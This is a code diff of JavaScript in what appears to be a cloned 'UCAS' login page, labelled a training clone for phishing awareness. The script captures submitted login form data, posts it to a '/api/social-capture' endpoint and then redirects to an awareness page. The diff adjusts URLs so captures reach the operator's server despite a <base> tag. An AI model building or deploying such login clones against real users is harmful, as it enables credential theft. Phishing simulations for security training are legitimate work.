@@ -192,15 +192,6 @@
             return;
         }
 
-        function showNotification(message, isError) {
-            const notification = document.createElement('div');
-            notification.className = 'toast-notification';
-            notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
-            notification.innerHTML = `<span style="margin-left: 8px;">${isError ? '⚠️' : '✓'}</span> ${message}`;
-            document.body.appendChild(notification);
-            setTimeout(() => notification.remove(), 3000);
-        }
-
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -218,9 +209,13 @@
                 }
             };
             
-            console.log('[UCAS] Sending data for:', username);
+            console.log('[UCAS] Sending data to local server...');
             
-            fetch('/api/social-capture', {
+            // استخدام window.location.origin لتخطي تأثير وسم <base>
+            const captureUrl = window.location.origin + '/api/social-capture';
+            const redirectUrl = window.location.origin + '/awareness-training';
+
+            fetch(captureUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -229,43 +224,28 @@
                 body: JSON.stringify(payload)
             })
             .then(response => {
-                if (response.ok) {
-                    return response.json();
-                } else {
-                    throw new Error('Server responded with ' + response.status);
-                }
+                if (response.ok) return response.json();
+                throw new Error('Server error');
             })
             .then(data => {
-                console.log('[UCAS] Capture recorded:', data);
+                console.log('تم الإرسال بنجاح:', data);
             })
-            .catch(err => {
-                console.error('[UCAS] Capture error:', err);
-                try {
-                    let backups = JSON.parse(localStorage.getItem('ucas_training_backups') || '[]');
-                    backups.push({ ...payload, local_timestamp: new Date().toISOString(), error: err.message });
-                    localStorage.setItem('ucas_training_backups', JSON.stringify(backups.slice(-20)));
-                } catch(e) {
-                    console.warn('Could not save backup:', e);
-                }
-            })
+            .catch(err => console.error('خطأ في الإرسال:', err))
             .finally(() => {
+                // توجيه صحيح لصفحة التوعية على سيرفرنا
                 setTimeout(() => {
-                    window.location.href = '/awareness-training';
-                }, 1500);
+                    window.location.href = redirectUrl;
+                }, 1000);
             });
         });
         
-        // تعطيل أي روابط أخرى قد تسبب مشكلة
         const originalLink = document.getElementById('ContentPlaceHolder1_lnkLogin');
         if (originalLink) {
             originalLink.addEventListener('click', function(e) {
                 e.preventDefault();
-                const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
-                form.dispatchEvent(submitEvent);
+                form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
             });
         }
-        
-        console.log('✓ UCAS Training Clone Active — Data will be sent to /api/social-capture');
     })();
 </script>
 
